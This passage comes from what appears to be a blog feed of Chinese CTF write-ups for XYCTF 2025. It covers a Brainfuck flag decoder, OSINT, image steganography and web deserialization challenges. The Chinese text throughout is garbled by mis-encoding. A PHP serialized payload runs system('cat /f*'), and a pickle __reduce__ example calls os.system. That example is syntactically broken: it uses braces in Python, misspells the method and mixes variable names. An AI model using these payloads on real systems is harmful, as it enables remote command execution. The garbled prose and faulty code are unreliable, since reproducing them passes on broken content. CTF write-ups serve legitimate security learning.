class="variable">$x</span> -&gt; b = &amp;<span class="variable">$x</span> -&gt; a;</span><br><span class="line"><span class="variable">$x</span> -&gt; c = <span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>);</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;R:<span class="number">2</span>;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>ç„¶ågetä¼ å…¥è¿™ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²å°±è¡Œ</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>xyctf2025éƒ¨åˆ†å¤ç›˜</title>
    <url>/posts/6341.html</url>
    <content><![CDATA[<p>xyctf2025éƒ¨åˆ†å¤ç›˜</p>
<span id="more"></span>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ç­¾ä¸ªåˆ°å§"><a href="#ç­¾ä¸ªåˆ°å§" class="headerlink" title="ç­¾ä¸ªåˆ°å§"></a>ç­¾ä¸ªåˆ°å§</h2><p>æœ€å°çš„ï¼Œå…·æœ‰å›¾çµå®Œå¤‡æ€§çš„è¯­è¨€æ˜¯ï¼Ÿ<br>æ„æ€å°±æ˜¯è€ƒbf  ç»™äº†ä¸€ä¸ªbfè¯­è¨€çš„é™„ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">&gt;+++++++++++++++++<span class="selector-attr">[&lt;++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;++++++++++++<span class="selector-attr">[&lt;+++++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="selector-attr">[&lt;+&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="selector-attr">[&lt;+&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++++++++++++++<span class="selector-attr">[&lt;+++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++<span class="selector-attr">[&lt;+++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++<span class="selector-attr">[&lt;+++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;++++++++++++<span class="selector-attr">[&lt;+++++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="selector-attr">[&lt;+&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;++++++++<span class="selector-attr">[&lt;++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="selector-attr">[&lt;+&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="selector-attr">[&lt;+&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++<span class="selector-attr">[&lt;+++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++<span class="selector-attr">[&lt;++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;++++++++<span class="selector-attr">[&lt;++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++<span class="selector-attr">[&lt;+++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++<span class="selector-attr">[&lt;++++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="selector-attr">[&lt;+&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="selector-attr">[&lt;+&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;++++++++++++<span class="selector-attr">[&lt;+++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;++++++++++<span class="selector-attr">[&lt;+++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++<span class="selector-attr">[&lt;+++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;++++++++++<span class="selector-attr">[&lt;+++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;++++++++<span class="selector-attr">[&lt;++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;++++++++++<span class="selector-attr">[&lt;+++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="selector-attr">[&lt;+&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++<span class="selector-attr">[&lt;+++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++<span class="selector-attr">[&lt;+++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++<span class="selector-attr">[&lt;++++++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++<span class="selector-attr">[&lt;++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;++++++++<span class="selector-attr">[&lt;++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++<span class="selector-attr">[&lt;+++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++<span class="selector-attr">[&lt;+++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++<span class="selector-attr">[&lt;+++++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++++++<span class="selector-attr">[&lt;++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++<span class="selector-attr">[&lt;+++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span>&gt;+++++++++++++++++++++++++<span class="selector-attr">[&lt;+++++&gt;-+-+-+-]</span>&lt;<span class="selector-attr">[-]</span></span><br></pre></td></tr></table></figure></div>
<p>brain fuckè¯­æ³•å¦‚ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAKEFILE"><figure class="iseeu highlight /makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">&gt;: æ•°æ®æŒ‡é’ˆå‘å³ç§»åŠ¨ä¸€ä½ã€‚</span></span><br><span class="line"><span class="section">&lt;: æ•°æ®æŒ‡é’ˆå‘å·¦ç§»åŠ¨ä¸€ä½ã€‚</span></span><br><span class="line"><span class="section">+: å°†æŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚çš„å€¼åŠ ä¸€ã€‚</span></span><br><span class="line"><span class="section">-: å°†æŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚çš„å€¼å‡ä¸€ã€‚</span></span><br><span class="line"><span class="section">.: è¾“å‡ºæŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚ï¼ˆä½œä¸º ASCII å­—ç¬¦ï¼‰ã€‚</span></span><br><span class="line"><span class="section">,: è¾“å…¥ä¸€ä¸ªå­—èŠ‚å¹¶å°†å…¶å€¼å­˜å‚¨åœ¨æŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚ä¸­ã€‚</span></span><br><span class="line"><span class="section">[: å¦‚æœæŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚ä¸º 0ï¼Œåˆ™è·³è½¬åˆ°å¯¹åº”çš„ ] ä¹‹åã€‚</span></span><br><span class="line"><span class="section">]: å¦‚æœæŒ‡é’ˆæŒ‡å‘çš„å­—èŠ‚ä¸ä¸º 0ï¼Œåˆ™è·³è½¬å›å¯¹åº”çš„ [ã€‚</span></span><br></pre></td></tr></table></figure></div>
<p>è§‚å¯Ÿè¿™æ®µä»£ç ï¼Œå¯ä»¥å‘ç°éƒ½æœ‰ä¸€æ®µä¸€æ®µçš„å›ºå®šæ ¼å¼æ‹¼æ¥  æ‹¿å‡ºä¸€æ®µåˆ†æ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BRAINFUCK"><figure class="iseeu highlight /brainfuck"><table><tr><td class="code"><pre><span class="line">&gt;<span class="literal">+++++++++++++++++</span><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span>&lt;<span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡ŒæŠŠcell1 å¢åŠ 17  ç„¶å<code>[&lt;++++++&gt;-+-+-+-]</code>æ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œå¯¹cell0 +6ç„¶å <code>-+-+-+-+-</code>æœ€åçš„æ•ˆæœæ˜¯-1ï¼Œè¿™ä¸ªå¾ªç¯æ¯æ¬¡å‡1ï¼Œæœ€åå½“cell1&#x3D;0çš„æ—¶å€™å°±å–æ¶ˆå¾ªç¯ï¼Œæ‰€ä»¥ç°åœ¨å¾—åˆ°çš„å€¼æ˜¯17 * 6 &#x3D; 102 å‘ç°è¿™ä¸ªæ˜¯fçš„asciiç ï¼Œæ‰€ä»¥è¿™ä¸ªæ˜¯flagçš„å¼€å¤´ï¼Œåªè¦æŒ‰è¿™æ ·å­æå–å‡ºæ‰€æœ‰çš„ä»£ç å—å°±èƒ½å¾—åˆ°flagï¼Œè¿™é‡Œæ¯æ¬¡è®¡ç®—å<code>[-]</code>ä¼šæ¸…ç©ºcellä¸­çš„å†…å®¹ï¼Œæ‰€ä»¥è¦ç”¨ä¸€ä¸ªæ­£åˆ™å»åŒ¹é… ç„¶åè®¡ç®—</p>
<p>çœ‹æ­£åˆ™ï¼š <code>&gt;(\+*)\[&lt;(\+*)&gt;.*?\].*?&lt;\[-\]</code> è¿™é‡Œæ•è·çš„å°±æ˜¯æ¯æ¬¡ä¸¤ä¸ªcellä¸­çš„è®¡ç®—å™¨<br>è„šæœ¬</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">bf_code = <span class="string">&quot;&quot;&quot;&quot;&quot;&quot;</span> <span class="comment"># é¢˜ç›®ç»™çš„bf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ¯ä¸ªè®¡ç®—å—çš„è®¡æ•°å™¨å’Œå¾ªç¯å†…å¢åŠ é‡</span></span><br><span class="line"><span class="comment"># æ¨¡å¼è§£é‡Š:</span></span><br><span class="line"><span class="comment"># &gt;(\+*)      : åŒ¹é… &#x27;&gt;&#x27; åé¢è·Ÿç€çš„0ä¸ªæˆ–å¤šä¸ª &#x27;+&#x27; (æ•è·ç»„1: è®¡æ•°å™¨)</span></span><br><span class="line"><span class="comment"># \[&lt;(\+*)&gt;    : åŒ¹é… &#x27;[&lt;&#x27; åé¢è·Ÿç€çš„0ä¸ªæˆ–å¤šä¸ª &#x27;+&#x27; (æ•è·ç»„2: å¾ªç¯å†…å¢åŠ é‡)</span></span><br><span class="line"><span class="comment"># .*?         : éè´ªå©ªåŒ¹é…ä»»æ„å­—ç¬¦ï¼Œç›´åˆ°ä¸‹ä¸€ä¸ªæ¨¡å¼</span></span><br><span class="line"><span class="comment"># &lt;\[-\]      : åŒ¹é…æœ€åçš„æ¸…é›¶éƒ¨åˆ†</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&gt;(\+*)\[&lt;(\+*)&gt;.*?\].*?&lt;\[-\]&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">matches = pattern.findall(bf_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">    counter_pluses = <span class="built_in">len</span>(<span class="keyword">match</span>[<span class="number">0</span>])</span><br><span class="line">    loop_pluses = <span class="built_in">len</span>(<span class="keyword">match</span>[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è®¡ç®— ASCII å€¼å¹¶è½¬æ¢ä¸ºå­—ç¬¦</span></span><br><span class="line">    ascii_value = counter_pluses * loop_pluses</span><br><span class="line">    flag += <span class="built_in">chr</span>(ascii_value)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æå–åˆ°çš„ Flag æ˜¯:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;W3lC0me_t0_XYCTF_2025_Enj07_1t!&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="XGCTF"><a href="#XGCTF" class="headerlink" title="XGCTF"></a>XGCTF</h2><p>è€ƒå¯Ÿä¿¡æ¯æ”¶é›† </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQF"><figure class="iseeu highlight /sqf"><table><tr><td class="code"><pre><span class="line"><span class="number">2024</span>å¹´CTFshowä¸¾åŠäº†ä¸€åœºåä¸ºâ€œè¥¿ç“œæ¯â€çš„æ¯”èµ›ï¼ˆXGCTFï¼‰ã€‚å…¶ä¸­LamentXUåœ¨å‡ºé¢˜çš„æ—¶å€™ï¼Œä»æŸåœºæ¯”èµ›æ‹‰äº†é“åŸé¢˜ä¸‹æ¥æ”¹äº†æ”¹ï¼Œç»“æœä¼ æ–‡ä»¶çš„æ—¶å€™ä¼ é”™äº†ä¼ æˆåŸé¢˜äº†ã€‚å› ä¸ºè¿™ä»¶äº‹LamentXUçš„æŸå‹dragonkeepåœ¨ä»–ä¹‹å‰çš„åšå®¢ä¸Šçš„åŸé¢˜wpä¸ŠåŠ äº†ä¸€æ®µ<span class="built_in">flag</span>æ¥å˜²ç¬‘LamentXUã€‚è¯·ä½ æ‰¾åˆ°XGCTFä¸­å”¯ä¸€ç”±LamentXUå‡ºçš„é¢˜ï¼Œå¹¶æ‰¾å‡ºè¿™é¢˜å¯¹åº”çš„åŸé¢˜ï¼Œæ¥ç€æ‰¾åˆ°dragonkeepå¸ˆå‚…çš„åšå®¢ï¼Œå¹¶ä»åšå®¢ä¸Šè®²è§£è¯¥é¢˜çš„åšæ–‡ä¸­æ‰¾åˆ°<span class="built_in">flag</span>ã€‚ï¼ˆ<span class="built_in">hint</span>ï¼šdragonkeepå¸ˆå‚…å› ä¸ºæ¯”è¾ƒç©·ä¹°ä¸èµ·åŸŸåï¼Œå› æ­¤ä»–åšå®¢çš„åŸŸååœ¨dragonkeepçš„åŸºç¡€ä¸Šå¤šäº†ä¸ªå­—æ¯ï¼‰</span><br></pre></td></tr></table></figure></div>
<p>å…ˆå»ctfshowä¸­æ‰¾åˆ°LamentXUå¸ˆå‚…å‡ºçš„é¢˜ç›® å«åšeasy_polluted ç„¶åæœç´¢ä¸€ä¸‹è¿™ä¸ªåŸé¢˜ æ‰¾åˆ°æ˜¯2024ciscnåä¸œå—åŸé¢˜Pollute ç„¶åæœç´¢2024 CISCNåä¸œå—Pollute dragonkeep å°±èƒ½æ‰¾åˆ°åšå®¢ åœ¨æ³¨é‡Šä¸­æ‰¾åˆ°flag</p>
<h2 id="ä¼šé£çš„é›·å…‹è¨æ–¯"><a href="#ä¼šé£çš„é›·å…‹è¨æ–¯" class="headerlink" title="ä¼šé£çš„é›·å…‹è¨æ–¯"></a>ä¼šé£çš„é›·å…‹è¨æ–¯</h2><p>2025å¹´1æœˆ30æ—¥W1ndysä¸Šç½‘å†²æµªæ—¶ï¼Œæ”¶åˆ°äº†èˆå‹å‘æ¥çš„èŠå¤©è®°å½•ï¼ŒèŠå¤©è®°å½•æ˜¾ç¤ºï¼Œä¸€å°å­©æ”¾é­ç‚®å¼•çˆ†åœ°é¢ï¼Œè¯·å®šä½çˆ†ç‚¸ç‚¹çš„å…·ä½“ä½ç½®ï¼Œè¯¥é¢˜è§£å‡ºéœ€è¦é€šè¿‡æ­£å¸¸çš„osinté¢˜ç›®åšé¢˜æ€è·¯</p>
<p>å¦‚æœç›´æ¥æœç´¢è¿™ä¸ªäº‹ä»¶åªèƒ½æœåˆ°<code>å››å·çœå†…æ±Ÿå¸‚èµ„ä¸­å¿æ°´å—é•‡æ˜¥å²šåŒ—è·¯</code> åé¢éœ€è¦æŸ¥è¿™é™„ä»¶çš„å»ºç­‘ï¼Œå°è¯•åæ˜¯ä¸­é“åŸå¸‚ä¸­å¿ƒ<br>æœ€ç»ˆçš„flagæ˜¯flag{å››å·çœå†…æ±Ÿå¸‚èµ„ä¸­å¿æ˜¥å²šåŒ—è·¯ä¸­é“åŸå¸‚ä¸­å¿ƒå†…}  </p>
<p>å­¦åˆ°è¿™ç±»é¢˜ç›®åœ¨å®šä½ä¹‹åï¼Œå¦‚æœä¸å¯¹è¦é€‚å½“å‡å°‘ï¼Œå¦‚è¿™é‡Œçš„é•‡åå­— é€‚å½“å¢åŠ  å¦‚è¿™é‡Œçš„å»ºç­‘åœºæ‰€å</p>
<h2 id="å–œæ¬¢å°±è¯´å‡ºæ¥"><a href="#å–œæ¬¢å°±è¯´å‡ºæ¥" class="headerlink" title="å–œæ¬¢å°±è¯´å‡ºæ¥"></a>å–œæ¬¢å°±è¯´å‡ºæ¥</h2><p>å°Sharkåœ¨ä¸Šè¯¾æ—¶å’Œè‡ªå·±çš„æš—æ‹å¯¹è±¡ååœ¨äº†ä¸€èµ·ï¼Œå°Sharkæƒ³è¦æŠŠæ‚„æ‚„è¯å’Œæ–‡ä»¶ä¼ ç»™åŒæ¡Œï¼Œå¯æƒœå°Sharkæ²¡æœ‰ç§»åŠ¨ç¡¬ç›˜ï¼Œä¸è¿‡è¿™éš¾ä¸ä½èªæ˜çš„å°Sharkï¼Œå°Sharkåœ¨åŒæ¡Œçš„ç”µè„‘ä¸Šæ•²äº†å‡ ä¸‹é”®ç›˜ï¼Œç”¨è‡ªå·±çš„æµè§ˆå™¨ç»™åŒæ¡Œè¯•ä¼ äº†ä¸¤å¼ è‡ªå·±çš„ç…§ç‰‡å’Œä¸€å¥æ‚„æ‚„è¯ï¼Œä½ èƒ½å‘ç°å°Sharkå¯¹åŒæ¡Œè¯´äº†ä»€ä¹ˆå—ï¼Ÿä¼šä¸ä¼šæ˜¯â€¦â€¦520?!å‘¢?<br>è¦åœ¨æµé‡åŒ…é‡Œæ‰¾åˆ°å±€åŸŸç½‘å†…çš„æµé‡,çœ‹çœ‹éƒ½ä¼ äº†ä»€ä¹ˆ<br>å·å·å–œæ¬¢æ˜¯çœ‹ä¸å‡ºæ¥çš„å“¦!;3.R&#x3D;5,G&#x3D;2,B&#x3D;0çœ‹çœ‹è¿™ä¸‰ä¸ªé¢œè‰²é€šé“é‡Œæœ‰ä»€ä¹ˆ&gt;_&lt;</p>
<p>å¾—åˆ°ä¸€ä¸ªäº†æµé‡åŒ…ï¼Œç”¨wiresharkæ‰“å¼€ä¹‹ååˆ°å¤„httpå¯¹è±¡<br><img src="https://pic1.imgdb.cn/item/685ba52f58cb8da5c86fbd41.png"><br>æ‰“å¼€è¿™ä¸ªphpæ–‡ä»¶ï¼Œå‘ç°æ˜¯pngæ–‡ä»¶  è¿™ä¸ªpngæ–‡ä»¶è¦æŠŠå‰é¢çš„httpè¯·æ±‚å¤´åˆ æ‰ï¼Œä¸ç„¶å›¾ç‰‡æ‰“ä¸å¼€<br>ç„¶åç”¨010æ‰“å¼€å‘ç°æœ‰ä¸¤ä¸ªIDHRå¤´ å’Œé¢˜ç›®è¯´çš„ä¸¤å¼ å›¾ç‰‡å¯¹åº”äº†<br><img src="https://pic1.imgdb.cn/item/685ba76b58cb8da5c86fc19d.png"><br>ç”¨tweakpng æ‰“å¼€ ç„¶åå…ˆæŠŠåŸæ¥çš„å›¾ç‰‡å¤åˆ¶ä¸¤ä»½  åˆ†ç¦»å‡ºä¸¤ä¸ªpng<br><img src="https://pic1.imgdb.cn/item/685ba9d358cb8da5c86fcc8e.png"><br>è¿™é‡Œæœ‰ä¸¤ç§å½¢å¼çš„å— å…ˆåˆ é™¤ä¸€ç§<br>ç„¶åè¿™é‡Œå›¾ç‰‡å¤´å’Œå›¾ç‰‡å°¾  æŠŠå®ƒä»¬æ”¾åœ¨ä¸¤è¾¹ï¼Œç„¶åç°åœ¨ä¿å­˜  æ‰“å¼€å›¾ç‰‡å¯ä»¥çœ‹åˆ°ä¸€éƒ¨åˆ† ç»§ç»­è°ƒæ•´ä¸­é—´çš„éƒ¨åˆ†<br>è·Ÿç€wpå¤ç°è°ƒæ•´ï¼Œå¥½åƒå°±æ˜¯è¦ä¸€ç›´å°è¯•å¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†çš„flag ç„¶åå¦ä¸€å¼ å›¾ç‰‡ä¹Ÿç”¨åŒæ ·çš„åŠæ³•<br>å¦ä¸€å¼ å›¾ç‰‡è¦æŠŠå±äºç¬¬ä¸€å¼ å›¾ç‰‡æ‰€æœ‰çš„å—éƒ½åˆ é™¤<br>ç¬¬äºŒå¼ é‡Œæ²¡æœ‰ä»€ä¹ˆå†…å®¹ï¼Œæ ¹æ®é¢˜ç›®çš„æç¤ºç”¨stegsolveæ‰“å¼€ rgbæ”¹æˆ520<br><img src="https://pic1.imgdb.cn/item/685bc08158cb8da5c8701e33.png"><br>flag{WatAshl_W@_anAta_G@_t0kubetsu_Suki!!!}<br>è¿™é¢˜è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤š  </p>
<h2 id="æ›¼æ³¢æ›¼æ³¢æ›¼æ³¢"><a href="#æ›¼æ³¢æ›¼æ³¢æ›¼æ³¢" class="headerlink" title="æ›¼æ³¢æ›¼æ³¢æ›¼æ³¢"></a>æ›¼æ³¢æ›¼æ³¢æ›¼æ³¢</h2><p>æ‹¿åˆ°é™„ä»¶ä¹‹åå‘ç°æ˜¯ä¸€ä¸ªbase64ï¼Œå¼€å¤´æ˜¯ç­‰äºå·ï¼Œè¯´æ˜æ˜¯é€†åºï¼Œåœ¨cyberchefä¸­è§£ç ï¼Œä¿å­˜å›¾ç‰‡<br><img src="https://s3.bmp.ovh/imgs/2025/06/30/5dfa708476404565.png"></p>
<p>ç„¶åç”¨binwalkåˆ†ç¦»ä¸€ä¸‹éšè—å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">(base) kakeru@bogon Downloads % binwalk -e /Users/kakeru/Downloads/manbo.jpg</span><br><span class="line"></span><br><span class="line"><span class="section">                                    /Users/kakeru/Downloads/extractions/manbo.jpg</span></span><br><span class="line"><span class="section">---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="section">DECIMAL                            HEXADECIMAL                        DESCRIPTION</span></span><br><span class="line"><span class="section">---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">0                                  0x0                                JPEG image, total size: 257649 bytes</span><br><span class="line">257649                             0x3EE71                            ZIP archive, file count: 1, total size: </span><br><span class="line"><span class="section">                                                                      1951848 bytes</span></span><br><span class="line"><span class="section">---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">[#] Extraction of jpeg data at offset 0x0 declined</span><br><span class="line">[+] Extraction of zip data at offset 0x3EE71 completed successfully</span><br><span class="line">-------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°zipåï¼Œé‡Œé¢æç¤ºå¯†ç æ˜¯<code>XYCTF2025</code><br>å¾—åˆ°ç¬¬äºŒå¼ å›¾ç‰‡ï¼Œ<br><img src="https://s3.bmp.ovh/imgs/2025/06/30/d32c265f5d961d0d.png"><br>è¿™ä¸ªæ˜¯ç›²æ°´å°bwmå·¥å…·çš„é»˜è®¤å›¾ç‰‡ï¼Œç›´æ¥ç”¨puzzlesolverè§£è¿™ä¸ªç›²æ°´å°<br><img src="https://s3.bmp.ovh/imgs/2025/06/30/5247316db72e3c1d.png"><br><img src="https://s3.bmp.ovh/imgs/2025/06/30/edb3e1dbf6da21b7.png"><br>XYCTF{easy_yin_xie_dfbfuj877}</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>æ„Ÿè§‰å¹¶ä¸æ˜¯å¾ˆsigninï¼ˆ<br>è¿™é¢˜çš„è€ƒç‚¹æ˜¯pickleååºåˆ—åŒ–<br>åœ¨pythonä¸­ä¹Ÿæœ‰åºåˆ—åŒ–ï¼Œpickleå°±æ˜¯æä¾›ååºåˆ—åŒ–çš„ä¸€ä¸ªåŒ… åœ¨éœ€è¦ä»å­—ç¬¦ä¸²ä¸­æå–ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™å°±è¦ååºåˆ—åŒ–ï¼Œä¸æ°å½“çš„ååºåˆ—åŒ–å°±ä¼šé€ æˆæ”»å‡»ï¼Œå’Œphpçš„ä¸€æ ·ã€‚<br>åºåˆ—åŒ–ï¼špickle.dumps()   ååºåˆ—åŒ–: pickle.loads() ååºåˆ—åŒ–åº•å±‚åŸºäº_Unpicklerç±»<br>pickletoolsæ˜¯pythonè‡ªå¸¦çš„pickleè°ƒè¯•å™¨ ä¸»è¦æœ‰ä¸‰ä¸ªåŠŸèƒ½ã€Œåæ±‡ç¼–ã€ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²ã€ã€Œä¼˜åŒ–ã€ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²ã€è¿”å›ä¸€ä¸ªè¿­ä»£å™¨æ¥ä¾›ç¨‹åºä½¿ç”¨<br>__ruduce__æ–¹æ³•ç±»ä¼¼äºphpä¸­çš„wakeupæ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–æ‰§è¡Œæ—¶ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œè¿”å›å€¼çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‡½æ•°åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å…ƒç»„ï¼Œæ˜¯ç¬¬ä¸€ä¸ªå‡½æ•°çš„å‚æ•° å¯ä»¥åˆ©ç”¨è¿™ä¸ªruduceå‡½æ•°æ¥rce</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">kakeru</span>()&#123;</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="variable language_">self</span>.data = x</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__ruduce__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span>(os.system,(<span class="string">&quot;whoami&quot;</span>,))</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">paylod = pickle.dumps(kakeru())</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure></div>
<p>æŠŠç”Ÿæˆçš„payloadç»™å¦ä¸€ä¸ªç±»å°±å¯ä»¥äº†<br>ç°åœ¨æ¥çœ‹è¿™é“é¢˜ æºç ç»™äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   main.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/28 22:20:49</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span 